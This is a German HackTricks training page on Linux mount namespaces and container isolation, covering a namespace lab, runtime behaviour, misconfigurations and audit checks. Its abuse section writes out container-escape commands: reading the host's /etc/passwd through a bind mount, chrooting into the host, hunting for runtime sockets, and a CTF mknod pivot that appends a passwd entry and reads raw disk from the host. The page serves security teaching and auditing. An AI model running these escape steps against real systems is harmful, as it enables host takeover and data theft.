# Mount-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Mount-Namespace steuert die **Mount-Tabelle**, die ein Prozess sieht. Dies ist eines der wichtigsten Container-Isolationsmerkmale, da das Root-Dateisystem, bind mounts, tmpfs mounts, die procfs-Ansicht, sysfs-Exposition und viele runtime-spezifische Hilfs-Mounts alle durch diese Mount-Tabelle ausgedrückt werden. Zwei Prozesse können beide auf `/`, `/proc`, `/sys` oder `/tmp` zugreifen, aber worauf diese Pfade aufgelöst werden, hängt vom Mount-Namespace ab, in dem sie sich befinden.

Aus Sicht der Container-Sicherheit ist der Mount-Namespace oft der Unterschied zwischen „dies ist ein ordentlich vorbereitetes Anwendungsdateisystem“ und „dieser Prozess kann das Host-Dateisystem direkt sehen oder beeinflussen“. Deshalb drehen sich bind mounts, `hostPath` volumes, privilegierte Mount-Operationen und beschreibbare `/proc`- oder `/sys`-Expositionen alle um diesen Namespace.

## Funktionsweise

Wenn eine Runtime einen Container startet, erstellt sie in der Regel ein neues Mount-Namespace, bereitet ein Root-Dateisystem für den Container vor, mountet procfs und andere Hilfsdateisysteme nach Bedarf und fügt dann optional bind mounts, tmpfs mounts, Secrets, ConfigMaps oder host paths hinzu. Sobald dieser Prozess innerhalb des Namespace läuft, ist die Menge der sichtbaren Mounts weitgehend vom Standard-View des Hosts entkoppelt. Der Host sieht möglicherweise weiterhin das tatsächlich zugrundeliegende Dateisystem, aber der Container sieht die vom Runtime für ihn zusammengesetzte Version.

Das ist mächtig, weil es dem Container vorgaukelt, er habe ein eigenes Root-Dateisystem, obwohl der Host weiterhin alles verwaltet. Es ist aber auch gefährlich, denn wenn die Runtime den falschen Mount freilegt, gewinnt der Prozess plötzlich Sichtbarkeit auf Host-Ressourcen, die vom übrigen Sicherheitsmodell möglicherweise nicht geschützt wurden.

## Lab

Sie können ein privates Mount-Namespace mit:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Wenn du eine weitere Shell außerhalb dieses Mount-Namespaces öffnest und die Mount-Tabelle prüfst, wirst du sehen, dass der tmpfs-Mount nur innerhalb des isolierten Mount-Namespaces existiert. Das ist eine nützliche Übung, weil sie zeigt, dass Mount-Isolation keine abstrakte Theorie ist; der Kernel präsentiert dem Prozess buchstäblich eine andere Mount-Tabelle.
Wenn du eine weitere Shell außerhalb dieses Mount-Namespaces öffnest und die Mount-Tabelle prüfst, wird der tmpfs-Mount nur innerhalb des isolierten Mount-Namespaces existieren.

Innerhalb von Containern ist ein schneller Vergleich:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Das zweite Beispiel zeigt, wie einfach eine Laufzeitkonfiguration ein riesiges Loch in die Dateisystem-Grenze reißen kann.

## Laufzeitnutzung

Docker, Podman, containerd-basierte Stacks und CRI-O verlassen sich alle auf einen privaten Mount-Namespace für normale Container. Kubernetes baut auf demselben Mechanismus für volumes, projected secrets, config maps und `hostPath`-Mounts auf. Incus/LXC-Umgebungen verlassen sich ebenfalls stark auf Mount-Namespaces, besonders weil System-Container oft reichhaltigere und stärker maschinenähnliche Dateisysteme als Anwendungs-Container bereitstellen.

Das bedeutet, dass wenn Sie ein Problem mit einem Container-Dateisystem prüfen, Sie normalerweise keinen isolierten Docker-Fehler betrachten. Sie betrachten ein Mount-Namespace- und Laufzeitkonfigurationsproblem, ausgedrückt durch die Plattform, die die Workload gestartet hat.

## Fehlkonfigurationen

Der offensichtlichste und gefährlichste Fehler ist, das Host-Root-Dateisystem oder einen anderen sensiblen Host-Pfad durch ein bind mount offenzulegen, zum Beispiel `-v /:/host` oder ein beschreibbares `hostPath` in Kubernetes. An diesem Punkt lautet die Frage nicht mehr „kann der Container sich irgendwie befreien?“, sondern eher „wie viel nützlicher Host-Inhalt ist bereits direkt sichtbar und beschreibbar?“ Ein beschreibbares Host-Bind-Mount macht den Rest des Exploits oft zu einer einfachen Angelegenheit von Dateiplatzierung, chrooting, Konfigurationsänderung oder Erkennung von Runtime-Sockets.

Ein weiteres häufiges Problem ist, Host-`/proc` oder Host-`/sys` so offenzulegen, dass die sicherere Container-Sicht umgangen wird. Diese Dateisysteme sind keine normalen Daten-Mounts; sie sind Schnittstellen zum Kernel- und Prozesszustand. Wenn die Workload direkt die Host-Versionen erreicht, gelten viele der Annahmen hinter Container-Härtung nicht mehr sauber.

Schreibgeschützte Schutzmaßnahmen sind ebenfalls wichtig. Ein schreibgeschütztes Root-Dateisystem sichert einen Container nicht magisch, aber es entfernt einen großen Teil des Angreifer-Staging-Bereichs und erschwert Persistenz, das Platzieren von Hilfs-Binärdateien und Manipulationen an Konfigurationen. Umgekehrt gibt ein beschreibbares Root oder ein beschreibbares Host-Bind-Mount einem Angreifer Raum, den nächsten Schritt vorzubereiten.

## Missbrauch

Wenn der Mount-Namespace missbraucht wird, führen Angreifer typischerweise eine von vier Aktionen aus. Sie **lesen Host-Daten**, die außerhalb des Containers hätten bleiben sollen. Sie **ändern Host-Konfigurationen** über beschreibbare Bind-Mounts. Sie **mounten oder remounten zusätzliche Ressourcen**, falls capabilities und seccomp das erlauben. Oder sie **erreichen mächtige Sockets und Verzeichnisse für Runtime-Zustand**, die es ihnen erlauben, die Container-Plattform selbst um mehr Zugriff zu bitten.

Wenn der Container bereits das Host-Dateisystem sehen kann, ändert sich das restliche Sicherheitsmodell sofort.

Wenn Sie einen Host-Bind-Mount vermuten, prüfen Sie zuerst, was verfügbar ist und ob es beschreibbar ist:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Wenn das Root-Dateisystem des Hosts im read-write-Modus gemountet ist, ist direkter Host-Zugriff oft so einfach wie:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Wenn das Ziel privilegierter Laufzeitzugriff statt direktem chrooting ist, liste Sockets und den Laufzeitzustand auf:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste außerdem, ob neue mounts aus dem container heraus erstellt werden können:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Vollständiges Beispiel: Two-Shell `mknod` Pivot

Ein spezialisierterer Missbrauchsweg entsteht, wenn der container root user Blockgeräte erstellen kann, der host und der container auf nützliche Weise eine Benutzeridentität teilen und der Angreifer bereits einen low-privilege foothold auf dem host hat. In diesem Fall kann der container einen device node wie `/dev/sda` erstellen, und der low-privilege host user kann später darüber über `/proc/<pid>/root/` für den passenden container-Prozess lesen.

Inside the container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vom Host aus, als entsprechender Low-Privilege-Benutzer, nachdem die PID der Container-Shell ermittelt wurde:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die wichtigste Lektion ist nicht die exakte CTF-String-Suche. Vielmehr ist die Erkenntnis, dass mount-namespace-Exposition durch `/proc/<pid>/root/` einem Host-Benutzer erlauben kann, container-erstellte device nodes wiederzuverwenden, selbst wenn die cgroup device policy die direkte Nutzung innerhalb des Containers verhindert hat.

## Prüfungen

Diese Befehle zeigen dir die Dateisystemansicht, in der der aktuelle Prozess tatsächlich lebt. Ziel ist es, vom Host stammende Mounts, schreibbare sensible Pfade und alles zu erkennen, das weiter gefasst erscheint als das normale root-Dateisystem eines Anwendungs-Containers.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Was hier interessant ist:

- Bind mounts vom Host, insbesondere `/`, `/proc`, `/sys`, Verzeichnisse mit Laufzeitdaten oder Socket-Standorte, sollten sofort auffallen.
- Unerwartete read-write mounts sind in der Regel wichtiger als eine große Anzahl read-only Hilfs-mounts.
- `mountinfo` ist oft der beste Ort, um zu prüfen, ob ein Pfad wirklich vom Host stammt oder overlay-backed ist.

Diese Prüfungen legen fest, **welche Ressourcen in diesem Namespace sichtbar sind**, **welche davon vom Host stammen**, und **welche davon beschreibbar oder sicherheitsrelevant sind**.
